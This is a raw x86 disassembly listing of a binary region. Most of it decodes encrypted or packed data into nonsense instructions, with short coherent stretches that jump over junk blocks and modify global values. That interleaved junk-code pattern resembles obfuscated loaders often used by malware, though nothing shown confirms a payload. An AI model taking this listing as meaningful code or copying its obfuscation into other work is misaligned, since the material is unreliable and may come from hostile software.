  40dafc:	mov    edi,0xc2eaf95
  40db01:	jl     0x40daf6
  40db03:	aas    
  40db04:	in     eax,0x97
  40db06:	and    eax,DWORD PTR [esi-0x16]
  40db09:	xor    eax,0xe1b581b
  40db0e:	mov    eax,DWORD PTR [ecx+esi*2-0x4590b175]
  40db15:	inc    edi
  40db16:	imul   ebx,DWORD PTR [esi+0x1f6f3d7c],0x28
  40db1d:	adc    al,0x6d
  40db1f:	xor    BYTE PTR [esi-0x3a27a059],0x67
  40db26:	push   ss
  40db27:	outs   dx,DWORD PTR ds:[esi]
  40db28:	js     0x40db20
  40db2a:	lea    edi,[ebx+ecx*1-0x66]
  40db2e:	popf   
  40db2f:	mul    BYTE PTR [ecx+0x6c2fc62a]
  40db35:	dec    esp
  40db36:	mov    al,BYTE PTR [edi+0xcfdccae]
  40db3c:	(bad)  
  40db3d:	fdivr  st,st(6)
  40db3f:	out    0xed,al
  40db41:	adc    edx,edi
  40db43:	pop    ss
  40db44:	test   al,0xbc
  40db46:	mov    al,ds:0xfd897e02
  40db4b:	adc    DWORD PTR ds:0x96089f56,ecx
  40db51:	dec    esi
  40db52:	xchg   edx,eax
  40db53:	(bad)  
  40db54:	hlt    
  40db55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db56:	push   esp
  40db57:	call   0x5cf54a89
  40db5c:	and    edi,ebx
  40db5e:	out    dx,al
  40db5f:	or     eax,0x55db51a4
  40db64:	mov    cl,BYTE PTR ds:0xe3f924e
  40db6a:	fnstsw WORD PTR [edx-0x4d]
  40db6d:	icebp  
  40db6e:	int    0xd2
  40db70:	adc    eax,0xa81baab4
  40db75:	fst    QWORD PTR [esi]
  40db77:	cmp    eax,0xc3bf8cea
  40db7c:	popa   
  40db7d:	mov    esp,0x8c9a08a6
  40db82:	xor    cl,BYTE PTR [eax+ecx*4+0x7099b93b]
  40db89:	add    bl,dl
  40db8b:	jb     0x40db7e
  40db8d:	add    eax,0xbe71c84e
  40db92:	lods   al,BYTE PTR ds:[esi]
  40db93:	push   ds
  40db94:	div    BYTE PTR [edi+0x30d5d8db]
  40db9a:	jno    0x40dbe2
  40db9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db9d:	mov    ds:0xc809b06e,eax
  40dba2:	pushf  
  40dba3:	mov    dh,0x8f
  40dba5:	mov    ah,0x6
  40dba7:	leave  
  40dba8:	test   eax,0xf3daf7e2
  40dbad:	loopne 0x40db95
  40dbaf:	nop
  40dbb0:	mov    ebx,DWORD PTR [ebx+0x5e]
  40dbb3:	mov    esi,0xfc13bbf
  40dbb8:	test   DWORD PTR [eax-0x74fffffe],eax
  40dbbe:	inc    ebp
  40dbbf:	cld    
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x5840145c],0xfad23113
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc51
  40dbe0:	enter  0x9053,0x27
  40dbe4:	ins    DWORD PTR es:[edi],dx
  40dbe5:	push   0x45994225
  40dbea:	pop    ebp
  40dbeb:	push   edi
  40dbec:	add    al,0x36
  40dbee:	in     al,0x3
  40dbf0:	sub    al,0xc2
  40dbf2:	(bad)  
  40dbf3:	inc    eax
  40dbf4:	add    esp,esp
  40dbf6:	inc    ecx
  40dbf7:	adc    esi,DWORD PTR [eax]
  40dbf9:	mov    esp,0xa2ad349e
  40dbfe:	dec    ecx
  40dbff:	pop    es
  40dc00:	jae    0x40dbd8
  40dc02:	ficom  DWORD PTR [ebx+ecx*1]
  40dc05:	cmp    ebp,esp
  40dc07:	dec    ebx
  40dc08:	xor    edx,edx
  40dc0a:	and    al,0x9c
  40dc0c:	pop    eax
  40dc0d:	mov    ds:0x93796849,eax
  40dc12:	xchg   esi,eax
  40dc13:	xchg   ebp,eax
  40dc14:	call   0x14b:0xbe7c353a
  40dc1b:	loope  0x40dbf0
  40dc1d:	nop
  40dc1e:	and    eax,ebp
  40dc20:	fldenv [ecx]
  40dc22:	and    BYTE PTR [eax+0xa],dl
  40dc25:	adc    DWORD PTR [ebx],edx
  40dc27:	add    ebp,DWORD PTR [ebp+ecx*4+0x4172866b]
  40dc2e:	int    0xee
  40dc30:	lods   eax,DWORD PTR ds:[esi]
  40dc31:	xchg   esi,eax
  40dc32:	push   cs
  40dc33:	(bad)  
  40dc34:	cmp    eax,0x44952ff9
  40dc39:	jno    0x40dc0f
  40dc3b:	iret   
  40dc3c:	sahf   
  40dc3d:	mov    cl,0x12
  40dc3f:	sbb    al,0xa4
  40dc41:	cli    
  40dc42:	sbb    BYTE PTR ds:0x45f0f454,ch
  40dc48:	call   0xbb6b79d0
  40dc4d:	xlat   BYTE PTR ds:[ebx]
  40dc4e:	enter  0x8fb7,0xf
  40dc52:	add    BYTE PTR [ebp+0x24],cl
  40dc55:	sti    
  40dc56:	adc    bl,BYTE PTR [esi-0x7f]
  40dc59:	(bad)  
  40dc5a:	scas   al,BYTE PTR es:[edi]
  40dc5b:	pop    eax
  40dc5c:	push   ds
  40dc5d:	div    bh
  40dc5f:	hlt    
  40dc60:	jno    0x40dc06
  40dc62:	mov    cl,0xa4
  40dc64:	jae    0x40dc92
  40dc66:	mov    BYTE PTR [ebx+0x1c],dh
  40dc69:	ins    DWORD PTR es:[edi],dx
  40dc6a:	dec    edi
  40dc6b:	dec    ebx
  40dc6c:	xor    dh,BYTE PTR [ebx+0x240322bb]
  40dc72:	mov    ah,0x2
  40dc74:	ja     0x40dc9b
  40dc76:	sub    ch,BYTE PTR [eax-0x64]
  40dc79:	cli    
  40dc7a:	xor    BYTE PTR [ebx+0x479c17b],bl
  40dc80:	push   edx
  40dc81:	xchg   esi,eax
  40dc82:	div    BYTE PTR [edx]
  40dc84:	jge    0x40dc5a
  40dc86:	and    eax,0xe048c3b1
  40dc8b:	scas   al,BYTE PTR es:[edi]
  40dc8c:	xchg   ebx,eax
  40dc8d:	call   0xaf08:0xa0e8ed6
  40dc94:	lea    ebp,[eax+ebx*1-0x11]
  40dc98:	mov    BYTE PTR [ebx+ecx*2-0x4b26e7f2],dh
  40dc9f:	(bad)  
  40dca0:	adc    DWORD PTR [ecx+0x2a],ecx
  40dca3:	pop    ecx
  40dca4:	scas   al,BYTE PTR es:[edi]
  40dca5:	push   es
  40dca6:	ja     0x40dc91
  40dca8:	test   DWORD PTR [ebp+edx*2-0x34],esp
  40dcac:	bound  edi,QWORD PTR [ebx-0x67e20088]
  40dcb2:	mov    BYTE PTR [edi+ebx*1+0x6e527484],dl
  40dcb9:	mov    ah,0xef
  40dcbb:	push   ecx
  40dcbc:	scas   eax,DWORD PTR es:[edi]
  40dcbd:	mov    esp,0xe40de3d7
  40dcc2:	cmp    BYTE PTR [ebp+0x31f25d6],0x5e
  40dcc9:	mov    dl,0x5c
  40dccb:	fs dec edi
  40dccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcce:	rcl    BYTE PTR [eax+ecx*8+0x28],1
  40dcd2:	cmp    al,0x4a
  40dcd4:	lea    ecx,[edi+ebx*2]
  40dcd7:	stc    
  40dcd8:	sub    DWORD PTR fs:[edi],ebp
  40dcdb:	fisubr DWORD PTR [esi]
  40dcdd:	lds    edi,FWORD PTR [ebx+0x30b9c888]
  40dce3:	fdiv   QWORD PTR [ebp+ebp*4-0x74c6f225]
  40dcea:	aam    0xc7
  40dcec:	cwde   
  40dced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcee:	enter  0x365b,0xf3
  40dcf2:	dec    ecx
  40dcf3:	gs (bad) 
  40dcf5:	fucom  st(1)
  40dcf7:	lea    eax,[esi+0x29]
  40dcfa:	mov    al,0x90
  40dcfc:	call   0x200eaf1c
  40dd01:	inc    ecx
  40dd02:	cli    
  40dd03:	pushf  
  40dd04:	push   ds
  40dd05:	(bad)  
  40dd07:	out    dx,eax
  40dd08:	add    BYTE PTR [ebx],bl
  40dd0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd0b:	mov    WORD PTR [ebx-0x598a5f43],gs
  40dd11:	push   ds
  40dd12:	fsubr  QWORD PTR [ebx-0x3d]
  40dd15:	inc    ebp
  40dd16:	mov    DWORD PTR [esi-0x19d69132],edx
  40dd1c:	mov    ds:0xa0311354,eax
  40dd21:	mov    ds:0x5035c71f,al
  40dd26:	repnz push es
  40dd28:	fadd   QWORD PTR [esi]
  40dd2a:	sets   ah
  40dd2d:	push   ebx
  40dd2e:	cwde   
  40dd2f:	(bad)  
  40dd30:	ja     0x40dd31
  40dd32:	fisub  WORD PTR [esi+eax*4-0x2dc1b950]
  40dd39:	sub    eax,0xee739be8
  40dd3e:	test   DWORD PTR ds:0xd06fede4,ebx
  40dd44:	pop    esi
  40dd45:	or     BYTE PTR [esi-0x3cd3a782],ch
  40dd4b:	xor    BYTE PTR [edi],al
  40dd4d:	mov    esp,esi
  40dd4f:	repnz sbb DWORD PTR [edi],ebp
  40dd52:	les    ebx,FWORD PTR [eax]
  40dd54:	mov    eax,ds:0x5bd22a5a
  40dd59:	mov    edi,0x11fd76b2
  40dd5e:	in     al,dx
  40dd5f:	dec    esi
  40dd60:	loope  0x40dd79
  40dd62:	sbb    al,0xcc
  40dd64:	fbstp  TBYTE PTR [edi+0x1d3ce997]
  40dd6a:	cmp    BYTE PTR [edx+0x302fe3b1],ah
  40dd70:	lods   eax,DWORD PTR ds:[esi]
  40dd71:	or     BYTE PTR [edi+eax*1+0x3],bh
  40dd75:	lock dec eax
  40dd77:	cmp    al,0x14
  40dd79:	ret    0xd13c
  40dd7c:	ins    BYTE PTR es:[edi],dx
  40dd7d:	mov    edi,0x924ee8a7
  40dd82:	clc    
  40dd83:	out    dx,eax
  40dd84:	xor    BYTE PTR [edx+0x6c],0xce
  40dd88:	dec    ebx
  40dd89:	rcl    BYTE PTR ds:[ebx-0x28afe8a],1
  40dd90:	retf   
  40dd91:	pop    ecx
  40dd92:	sub    ch,BYTE PTR ds:0x995a2eb2
  40dd98:	cwde   
  40dd99:	call   0x4a5a2882
  40dd9e:	pop    edi
  40dd9f:	sub    dh,ch
  40dda1:	das    
  40dda2:	jg     0x40dd66
  40dda4:	mov    WORD PTR [eax-0x785eeb52],ss
  40ddaa:	dec    ebx
  40ddab:	or     DWORD PTR [esi+0x30c11d10],esi
  40ddb1:	mov    ch,0x28
  40ddb3:	sbb    dl,BYTE PTR [edx+ecx*1]
  40ddb6:	popa   
  40ddb7:	xchg   BYTE PTR [edi+0x3],dl
  40ddba:	push   esi
  40ddbb:	pop    edi
  40ddbc:	dec    edx
  40ddbd:	and    al,0xda
  40ddc0:	dec    ecx
  40ddc1:	dec    cx
  40ddc3:	call   0x86d20eaf
  40ddc8:	xchg   esp,eax
  40ddc9:	(bad)  
  40ddca:	cdq    
  40ddcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddcc:	cdq    
  40ddcd:	popf   
  40ddce:	shl    BYTE PTR [ecx+0x34],cl
  40ddd1:	popa   
  40ddd2:	pop    eax
  40ddd3:	jo     0x40de35
  40ddd5:	add    al,0x51
  40ddd7:	lods   eax,DWORD PTR ds:[esi]
  40ddd8:	mov    ds:0x2371803e,eax
  40dddd:	mov    al,ds:0x62f30986
  40dde2:	cmp    eax,0x90ccc8c4
  40dde7:	jge    0x40ddb7
  40dde9:	in     eax,dx
  40ddea:	push   ecx
  40ddeb:	test   ecx,0xf6909f8f
  40ddf1:	jo     0x40dd86
  40ddf3:	jne    0x40ddd6
  40ddf5:	dec    ebx
  40ddf6:	ss imul BYTE PTR es:[esp+0x50]
  40ddfc:	nop    eax
  40ddff:	rol    DWORD PTR [esi],1
  40de01:	pop    eax
  40de02:	cmp    ecx,esi
  40de04:	jo     0x40de33
  40de06:	push   esp
  40de07:	mov    ds:0x4f53b796,eax
  40de0c:	add    eax,0x3080d2aa
  40de11:	addr16 push edx
  40de13:	idiv   edx
  40de15:	lods   eax,DWORD PTR ds:[esi]
  40de16:	daa    
  40de17:	test   dl,ch
  40de19:	std    
  40de1a:	cmp    eax,0xb33ef5de
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	div    DWORD PTR [eax-0x4547ccd5]
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40dec3
  40deb3:	retf   
  40deb4:	add    eax,0x3396561e
  40deb9:	xor    al,0x1
  40debb:	aaa    
  40debc:	ss clc 
  40debe:	inc    esi
  40debf:	dec    esp
  40dec0:	xor    DWORD PTR [ebp+0x53b46ffb],ebx
  40dec6:	jne    0x40dea5
  40dec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dec9:	xor    edi,DWORD PTR [ebx]
  40decb:	into   
  40decc:	cmp    DWORD PTR [esi],0x9
  40decf:	loopne 0x40deba
  40ded1:	lds    esp,FWORD PTR [eax+0x4e39deec]
  40ded7:	aad    0x40
  40ded9:	int    0x2
  40dedb:	clc    
  40dedc:	dec    ebx
  40dedd:	sahf   
  40dede:	addr16 inc esp
  40dee0:	lea    esi,[edi-0x46]
  40dee3:	cmp    DWORD PTR [eax+edx*8+0x4359defa],ebx
  40deea:	cmp    eax,0x2546bbc2
  40deef:	jbe    0x40df64
  40def1:	or     bh,BYTE PTR [edx+0x32]
  40def4:	out    dx,al
  40def5:	jnp    0x40de9c
  40def7:	jmp    0xc9fbd03e
  40defc:	mov    eax,0x113ff5c3
  40df01:	push   esp
  40df02:	xlat   BYTE PTR ds:[ebx]
  40df03:	xchg   DWORD PTR [ebx-0x415b36f7],edx
  40df09:	(bad)  
  40df0a:	xor    DWORD PTR [eax-0x40c0dd56],edi
  40df10:	cld    
  40df11:	cwde   
  40df12:	fcom   st(0)
  40df14:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40df16:	mov    ebp,ss
  40df18:	pushf  
  40df19:	xchg   edi,eax
  40df1a:	inc    ebp
  40df1b:	push   0x1f
  40df1d:	pop    es
  40df1e:	inc    esi
  40df1f:	xchg   ecx,eax
  40df20:	inc    esp
  40df21:	sub    BYTE PTR [esi+0x38],al
  40df24:	pop    ebp
  40df25:	pop    ecx
  40df26:	enter  0xe24d,0xe6
  40df2a:	jecxz  0x40df3b
  40df2c:	xchg   ecx,eax
  40df2d:	(bad)
  40df30:	test   eax,0x7f6607cc
  40df35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df36:	in     eax,dx
  40df37:	fucomip st,st(2)
  40df39:	in     eax,0x25
  40df3b:	aam    0x90
  40df3d:	cdq    
  40df3e:	mov    ah,0xd4
  40df40:	or     eax,0x7db283c
  40df45:	sub    ecx,DWORD PTR [ecx+0x8]
  40df48:	outs   dx,BYTE PTR ds:[esi]
  40df49:	dec    ebp
  40df4a:	push   esi
  40df4b:	mov    dh,0x19
  40df4d:	sbb    eax,0x572ed5e8
  40df52:	and    eax,0xa8be4c41
  40df57:	out    0x1e,al
  40df59:	adc    eax,0xd0afbd3
  40df5e:	cmp    eax,0x421b36e9
  40df63:	push   eax
  40df64:	or     ebp,DWORD PTR fs:[ebp+0x11a3a584]
  40df6b:	call   0x5732:0x23a59067
  40df72:	packuswb mm6,mm1
  40df75:	and    al,0x74
  40df77:	mov    esp,0x8bcb95e3
  40df7c:	inc    eax
  40df7d:	or     eax,0xd37e357c
  40df82:	mov    al,ds:0x310710ba
  40df87:	pop    ds
  40df88:	aad    0xaa
  40df8a:	test   eax,0x1c187169
  40df8f:	mov    ecx,0xd186aa66
  40df94:	ret    
  40df95:	or     DWORD PTR [ebx+0x607fd3e7],eax
  40df9b:	pop    ds
  40df9c:	dec    ebx
  40df9d:	add    ebp,DWORD PTR [edx-0x4d17f1a1]
  40dfa3:	pusha  
  40dfa4:	hlt    
  40dfa5:	data16 add ah,BYTE PTR [ecx-0x7c]
  40dfa9:	aaa    
  40dfaa:	xchg   esp,eax
  40dfab:	stos   BYTE PTR es:[edi],al
  40dfac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfad:	mov    edx,0x4b8aeaa7
  40dfb2:	js     0x40df66
  40dfb4:	jne    0x40df69
  40dfb6:	xlat   BYTE PTR ds:[ebx]
  40dfb7:	(bad)  
  40dfb8:	dec    ebp
  40dfb9:	je     0x40dff9
  40dfbb:	rol    edx,0x72
  40dfbe:	imul   esi,DWORD PTR [edx-0x4af4280],0x57bc475e
  40dfc8:	aad    0x27
  40dfca:	mov    al,ds:0x8b062f73
  40dfcf:	inc    ebp
  40dfd0:	or     BYTE PTR [ecx+0x4336972d],al
  40dfd6:	add    BYTE PTR ds:0x53000006,ah
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	xor    eax,ebp
  40e005:	scas   eax,DWORD PTR es:[edi]
  40e006:	jns    0x40e066
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40dfc4
  40e010:	mov    ah,0x84
  40e012:	dec    edi
  40e013:	cli    
  40e014:	and    ebx,DWORD PTR ds:0xf06d9719
  40e01a:	and    eax,0xd880402e
  40e01f:	cmc    
  40e020:	push   ecx
  40e021:	sub    DWORD PTR [eax-0x6d],0x72
  40e025:	xor    al,BYTE PTR [edx-0x6083df3]
  40e02b:	popf   
  40e02c:	add    ebx,DWORD PTR [ebx]
  40e02e:	and    edx,DWORD PTR [ebx+ebx*4-0x37f94e7]
  40e035:	mov    al,0xa6
  40e037:	(bad)  
  40e038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e039:	into   
  40e03a:	xchg   ecx,eax
  40e03b:	add    DWORD PTR [ebp+0x6f],edx
  40e03e:	int    0x4d
  40e040:	cwde   
  40e041:	fcom   QWORD PTR [ecx-0x1ad82be8]
  40e047:	rol    DWORD PTR [edi+0x2a449eb7],cl
  40e04d:	mov    DWORD PTR [ecx+0x37],ebx
  40e050:	shr    BYTE PTR [esi],cl
  40e052:	scas   al,BYTE PTR es:[edi]
  40e053:	mov    ecx,DWORD PTR [eax+ebp*8]
  40e056:	retf   
  40e057:	sbb    DWORD PTR [esp+ebx*1+0x52],edi
  40e05b:	arpl   WORD PTR [edi+0x6],ax
  40e05e:	ror    DWORD PTR [ecx],0x27
  40e061:	mov    dl,0x38
  40e063:	xchg   ebp,eax
  40e064:	inc    ebp
  40e065:	pop    ds
  40e066:	or     al,0xa3
  40e068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e069:	test   eax,0xcaedf60e
  40e06e:	mov    ds:0x7533deb0,al
  40e073:	xchg   edx,eax
  40e074:	je     0x40e0be
  40e076:	jmp    0x40e0c1
  40e078:	dec    esi
  40e079:	mov    edx,DWORD PTR [ebx]
  40e07b:	jns    0x40e03b
  40e07d:	mov    WORD PTR [eax-0xd],ds
  40e080:	jbe    0x40e09f
  40e082:	(bad)  
  40e083:	sti    
  40e084:	shr    DWORD PTR [ebp+0x2d],0x73
  40e088:	mov    ebp,0x64d8994b
  40e08d:	add    DWORD PTR [ebx],ecx
  40e08f:	or     al,0x3e
  40e091:	or     al,0xee
  40e093:	fs pop edi
  40e095:	mov    ebp,0x5641a28e
  40e09a:	xor    ah,BYTE PTR [ecx]
  40e09c:	fwait
  40e09d:	mov    al,ds:0x60b19fed
  40e0a2:	lahf   
  40e0a3:	xor    BYTE PTR [ebp-0x7821b9f1],0x85
  40e0aa:	mov    WORD PTR [edx-0x79],es
  40e0ad:	std    
  40e0ae:	xor    eax,0x1f3542f4
  40e0b3:	or     ebx,DWORD PTR [esi]
  40e0b5:	mov    eax,0x63dd611f
  40e0ba:	aam    0x62
  40e0bc:	in     eax,0x1f
  40e0be:	test   bh,cl
  40e0c0:	retf   
  40e0c1:	test   al,0x26
  40e0c3:	jnp    0x40e12a
  40e0c5:	jns    0x40e104
  40e0c7:	rcl    BYTE PTR ds:0xfccbd6d6,1
  40e0cd:	xor    ebp,DWORD PTR [ebp*4-0x8558468]
  40e0d4:	fbld   TBYTE PTR [ebx-0x444ff67]
  40e0da:	sahf   
  40e0db:	test   eax,0xc9198389
  40e0e0:	mov    ebx,0xc0109fa4
  40e0e5:	(bad)  
  40e0e7:	inc    esi
  40e0e8:	rcl    BYTE PTR [edx+0x15019f52],0xfb
  40e0ef:	and    edi,DWORD PTR [edx]
  40e0f1:	jno    0x40e0ca
  40e0f3:	dec    esi
  40e0f4:	jo     0x40e112
  40e0f6:	push   esp
  40e0f7:	addr16 cld 
  40e0f9:	xor    edi,DWORD PTR [eax+0x47d73e3e]
  40e0ff:	pop    ds
  40e100:	fadd   QWORD PTR [ecx+0x4379c267]
  40e106:	dec    edx
  40e107:	pushf  
  40e108:	fmul   QWORD PTR [ebp+0x6384c414]
  40e10e:	cmc    
  40e10f:	mov    DWORD PTR [ebx-0x647b035f],eax
  40e115:	hlt    
  40e116:	cmp    esi,DWORD PTR [ecx-0x4283caf0]
  40e11c:	cld    
  40e11d:	mov    esp,0x45859b45
  40e122:	in     eax,0x9c
  40e124:	test   ebp,eax
  40e126:	xor    al,0xa4
  40e128:	mov    esp,0xc633d67a
  40e12d:	adc    DWORD PTR ds:0x4336a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	xor    BYTE PTR [edx-0x658dfaf6],ch
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e107
  40e167:	lock sbb al,0xd
  40e16a:	nop
  40e16b:	loopne 0x40e0f2
  40e16d:	fs xchg ebx,eax
  40e16f:	(bad)  
  40e170:	fst    QWORD PTR [ebp+0x3b]
  40e173:	(bad)  
  40e175:	js     0x40e148
  40e177:	xchg   esi,eax
  40e178:	mov    ds:0xb38553ea,eax
  40e17d:	fidivr WORD PTR [edx-0x49]
  40e180:	jmp    0x40e188
  40e182:	loop   0x40e1ce
  40e184:	push   ss
  40e185:	jmp    0x40e139
  40e187:	adc    eax,0x5b85eca2
  40e18c:	adc    al,BYTE PTR [esp+ebx*4+0x4885989]
  40e193:	scas   al,BYTE PTR es:[edi]
  40e194:	test   al,ch
  40e196:	fwait
  40e197:	inc    esi
  40e198:	pusha  
  40e199:	mov    bh,0xdc
  40e19b:	inc    esi
  40e19c:	xor    eax,0x43f2b376
  40e1a1:	push   esi
  40e1a2:	push   esp
  40e1a3:	pop    edi
  40e1a4:	pop    edx
  40e1a5:	add    edx,DWORD PTR [ebp-0x39]
  40e1a8:	dec    esi
  40e1a9:	mov    dh,0x2e
  40e1ab:	aas    
  40e1ac:	mov    eax,ds:0xf82aa3ad
  40e1b1:	xor    esp,DWORD PTR [ebx-0x30e3cfab]
  40e1b7:	adc    DWORD PTR [ebp+0x912450c],ecx
  40e1bd:	xor    eax,0xb064b5f0
  40e1c2:	push   esp
  40e1c3:	mov    WORD PTR [esi+0x15],?
  40e1c6:	aas    
  40e1c7:	sub    esp,edi
  40e1c9:	(bad)  
  40e1ca:	jg     0x40e233
  40e1cc:	aad    0xbf
  40e1ce:	lods   eax,DWORD PTR ds:[esi]
  40e1cf:	sub    dh,ch
  40e1d1:	xor    al,0x12
  40e1d3:	mov    edi,0xbffdffed
  40e1d8:	call   0xde06:0xa3c17986
  40e1df:	adc    al,0x2e
  40e1e1:	pop    ebx
  40e1e2:	fbld   TBYTE PTR [esi-0x766a03b0]
  40e1e8:	rcl    DWORD PTR [eax-0x45],cl
  40e1eb:	in     eax,0x7c
  40e1ed:	ins    DWORD PTR es:[edi],dx
  40e1ee:	call   0x2b6e3df7
  40e1f3:	and    BYTE PTR [eax],ah
  40e1f5:	dec    esp
  40e1f6:	ds xchg edi,eax
  40e1f8:	fcmovne st,st(4)
  40e1fa:	push   eax
  40e1fb:	xor    DWORD PTR [edx],ecx
  40e1fd:	jge    0x40e20c
  40e1ff:	leave  
  40e200:	test   DWORD PTR [esi],esi
  40e202:	sub    BYTE PTR [ecx-0x6289880a],bh
  40e208:	add    bh,cl
  40e20a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e20b:	out    0x7b,al
  40e20d:	cdq    
  40e20e:	mov    ah,0x78
  40e210:	xchg   edx,eax
  40e211:	mov    esi,0x4c92c90e
  40e216:	pop    edx
  40e217:	in     eax,dx
  40e218:	xor    bh,0xf1
  40e21b:	repz jge 0x40e232
  40e21e:	inc    edx
  40e21f:	mov    WORD PTR [edx-0x7f6476a2],gs
  40e225:	xor    eax,0xf3a4f6b
  40e22a:	mov    ds:0xf42a11db,al
  40e22f:	mov    ecx,DWORD PTR [ebp+0x3d]
  40e232:	mov    edi,edi
  40e234:	cmp    eax,0x1796c40f
  40e239:	push   eax
  40e23a:	inc    esp
  40e23b:	cmc    
  40e23c:	fneni(8087 only) 
  40e23e:	push   edx
  40e23f:	adc    al,0x96
  40e241:	dec    esp
  40e242:	push   cs
  40e243:	test   ch,cl
  40e245:	dec    ebp
  40e246:	dec    edx
  40e247:	ins    BYTE PTR es:[edi],dx
  40e248:	push   edx
  40e249:	pushf  
  40e24a:	dec    esi
  40e24b:	xchg   ecx,eax
  40e24c:	and    BYTE PTR [ebp+0x7cdd6916],dl
  40e252:	stos   DWORD PTR es:[edi],eax
  40e253:	dec    ecx
  40e254:	cmp    eax,0xc4373c92
  40e259:	(bad)  
  40e25a:	push   cs
  40e25b:	rsm    
  40e25d:	cmc    
  40e25e:	push   0x6
  40e260:	xchg   esi,eax
  40e261:	fdivr  DWORD PTR [eax]
  40e263:	aas    
  40e264:	pop    ds
  40e265:	mov    ds:0x4a61bd7a,eax
  40e26a:	jl     0x40e1f1
  40e26c:	sub    eax,0x74a05d48
  40e271:	mov    bh,0x70
  40e273:	mov    DWORD PTR [edi-0x217c4ac2],ebx
  40e279:	inc    eax
  40e27a:	sub    DWORD PTR [esp+esi*1-0x11c4c816],edx
  40e281:	mov    bl,0x89
  40e283:	inc    ebp
  40e284:	call   0xff496014
  40e289:	add    eax,0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
